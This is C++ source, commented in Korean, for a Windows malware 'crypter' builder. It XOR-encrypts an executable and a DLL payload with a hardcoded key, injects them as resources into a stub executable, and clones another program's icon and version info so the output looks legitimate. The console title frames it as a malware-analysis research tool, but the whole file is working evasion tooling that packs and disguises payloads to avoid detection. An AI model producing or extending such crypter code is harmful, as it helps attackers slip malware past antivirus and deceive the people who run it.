#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <windows.h>

// =================================================================================
// Builder 로직 시작 (개선된 구조)
// =================================================================================

// 파일을 벡터로 읽는 함수
std::vector<unsigned char> read_file(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (!file) {
        std::cerr << "Error: Cannot open file " << filename << std::endl;
        return {};
    }
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<unsigned char> buffer(size);
    if (file.read(reinterpret_cast<char*>(buffer.data()), size)) {
        return buffer;
    }
    return {};
}

// XOR 암호화 함수
void xor_crypt(std::vector<unsigned char>& data) {
    const char key[] = "mysecretkey";
    for (size_t i = 0; i < data.size(); ++i) {
        data[i] ^= key[i % (sizeof(key) - 1)];
    }
}

// 리소스 복제 관련 구조체 및 콜백 함수
struct EnumResInfo {
    HANDLE hUpdate;
};

BOOL CALLBACK EnumResNameProcA(HMODULE hModule, LPCSTR lpType, LPSTR lpName, LONG_PTR lParam) {
    // 페이로드 리소스(ID 101, 102)는 복제하지 않도록 예외 처리
    if (IS_INTRESOURCE(lpType) && (UINT)lpType == (UINT)RT_RCDATA) { // 사용자 정의 데이터 타입인지 확인
        if (IS_INTRESOURCE(lpName) && ((UINT)lpName == 101 || (UINT)lpName == 102)) {
            return TRUE; // 건너뛰기
        }
    }

    EnumResInfo* info = (EnumResInfo*)lParam;
    HRSRC hRes = FindResourceA(hModule, lpName, lpType);
    if (hRes) {
        HGLOBAL hResLoad = LoadResource(hModule, hRes);
        if (hResLoad) {
            LPVOID lpResLock = LockResource(hResLoad);
            if (lpResLock) {
                DWORD dwSize = SizeofResource(hModule, hRes);
                UpdateResourceA(info->hUpdate, lpType, lpName, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), lpResLock, dwSize);
            }
        }
    }
    return TRUE;
}

BOOL CALLBACK EnumResTypeProcA(HMODULE hModule, LPSTR lpType, LONG_PTR lParam) {
    EnumResourceNamesA(hModule, lpType, EnumResNameProcA, lParam);
    return TRUE;
}

// 아이콘, 버전 정보 등 일반 리소스를 복제하는 함수
bool copy_resources(const std::string& source_path, const std::string& dest_path) {
    HMODULE hLib = LoadLibraryExA(source_path.c_str(), NULL, LOAD_LIBRARY_AS_DATAFILE);
    if (!hLib) {
        std::cerr << "Error: Could not load source file for resources: " << source_path << std::endl;
        return false;
    }

    EnumResInfo info;
    info.hUpdate = BeginUpdateResourceA(dest_path.c_str(), FALSE);
    if (!info.hUpdate) {
        std::cerr << "Error: Could not open destination file for resource update: " << dest_path << std::endl;
        FreeLibrary(hLib);
        return false;
    }

    EnumResourceTypesA(hLib, EnumResTypeProcA, (LONG_PTR)&info);

    FreeLibrary(hLib);

    if (!EndUpdateResourceA(info.hUpdate, FALSE)) {
        std::cerr << "Error: Could not write resources to destination file. Error: " << GetLastError() << std::endl;
        return false;
    }
    return true;
}

// 페이로드를 리소스로 주입하는 함수
bool add_payload_as_resource(const std::string& target_exe, int resource_id, const std::vector<unsigned char>& payload_data) {
    HANDLE hUpdate = BeginUpdateResourceA(target_exe.c_str(), FALSE);
    if (hUpdate == NULL) {
        std::cerr << "Error: Could not open file for resource update: " << target_exe << " (Error " << GetLastError() << ")" << std::endl;
        return false;
    }

    // RT_RCDATA는 일반 바이너리 데이터를 의미하는 표준 리소스 타입입니다.
    if (!UpdateResourceA(hUpdate, RT_RCDATA, MAKEINTRESOURCEA(resource_id), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)payload_data.data(), payload_data.size())) {
        std::cerr << "Error: Could not add resource to file. (Error " << GetLastError() << ")" << std::endl;
        EndUpdateResourceA(hUpdate, TRUE);
        return false;
    }

    if (!EndUpdateResourceA(hUpdate, FALSE)) {
        std::cerr << "Error: Could not write resource to file. (Error " << GetLastError() << ")" << std::endl;
        return false;
    }
    return true;
}


int main() {
    std::string stub_path, proj_exe, payload_dll, temp_exe, out_path;

    SetConsoleTitleA("Malware Analysis and Demonstration Research Crypter");

    std::cout << "--- C++ Crypter For Malware Analysis (Advanced) ---\n";
    std::cout << "Enter path for pre-compiled stub.exe: ";
    std::getline(std::cin, stub_path);
    std::cout << "Enter path for my_proj.exe (payload): ";
    std::getline(std::cin, proj_exe);
    std::cout << "Enter path for my_payload.dll (payload): ";
    std::getline(std::cin, payload_dll);
    std::cout << "Enter path for my_temp.exe (for icon/version resources): ";
    std::getline(std::cin, temp_exe);
    std::cout << "Enter final output file path (e.g., C:\\path\\to\\Final.exe): ";
    std::getline(std::cin, out_path);

    // 1. 최종 출력 경로에 스텁 파일 복사
    std::cout << "\n[1] Copying stub to output path...\n";
    if (!CopyFileA(stub_path.c_str(), out_path.c_str(), FALSE)) {
        std::cerr << "Error: Could not copy stub file. (Error " << GetLastError() << ")\n";
        system("pause");
        return 1;
    }
    std::cout << "    - Stub copied to " << out_path << "\n";

    // 2. 페이로드 파일 읽기
    std::cout << "[2] Reading payload files...\n";
    auto exe_bytes = read_file(proj_exe);
    auto dll_bytes = read_file(payload_dll);

    if (exe_bytes.empty() || dll_bytes.empty()) {
        std::cerr << "Failed to read one or more payload files. Aborting.\n";
        system("pause");
        return 1;
    }
    std::cout << "    - " << proj_exe << " (" << exe_bytes.size() << " bytes)\n";
    std::cout << "    - " << payload_dll << " (" << dll_bytes.size() << " bytes)\n";

    // 3. 페이로드 암호화
    std::cout << "[3] Encrypting payloads...\n";
    xor_crypt(exe_bytes);
    xor_crypt(dll_bytes);
    std::cout << "    - Encryption complete.\n";

    // 4. 암호화된 페이로드를 최종 파일의 리소스로 주입
    std::cout << "[4] Injecting payloads into final executable's resources...\n";
    if (!add_payload_as_resource(out_path, 101, exe_bytes)) { // EXE_PAYLOAD ID = 101
        std::cerr << "Error: Failed to inject EXE payload.\n";
        system("pause");
        return 1;
    }
    if (!add_payload_as_resource(out_path, 102, dll_bytes)) { // DLL_PAYLOAD ID = 102
        std::cerr << "Error: Failed to inject DLL payload.\n";
        system("pause");
        return 1;
    }
    std::cout << "    - Payloads injected successfully.\n";

    // 5. 아이콘, 버전 정보 등 기타 리소스 복제
    std::cout << "[5] Cloning icon and version info...\n";
    if (!copy_resources(temp_exe, out_path)) {
        std::cerr << "Error: Failed to clone resources.\n";
        system("pause");
        return 1;
    }
    std::cout << "    - Resources cloned successfully.\n";

    std::cout << "\nOperation completed! Final file created at: " << out_path << "\n";
    system("pause");

    return 0;
}